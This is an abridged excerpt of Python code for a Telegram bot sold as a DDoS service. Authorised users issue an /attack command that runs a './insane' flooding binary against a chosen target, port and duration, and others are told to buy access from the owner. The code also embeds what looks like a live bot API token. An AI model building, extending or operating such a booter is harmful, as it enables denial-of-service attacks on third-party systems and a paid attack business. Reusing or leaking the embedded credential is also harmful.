...
bot = telebot.TeleBot('7480968612:AAEZjr1x1O8lmO2K64OOS-I4i3zpcIp4A_E')
# Owner and admin user IDs
owner_id = "1221262658"
admin_ids = ["1221262658" "1221262658"]
...
def send_welcome(message):
    response = (
        f"🌟 Welcome to the INSANE DDOS Bot! 🌟\n\n"
    ...
    if user_id in allowed_user_ids:
        ...
        if len(command) == 4 or (not message.text.startswith('/') and len(command) == 3):
            ...
            if time > 300:
                ...
                full_command = f"./insane {target} {port} {time} 900"
        ...
        response = ("🚫 Unauthorized Access! 🚫\n\nOops! It seems like you don't have permission to use the /attack command. "
                    ...
                    "🌟THE ONLY OWNER IS @iNSANE_010 DM TO BUY ACCESS")
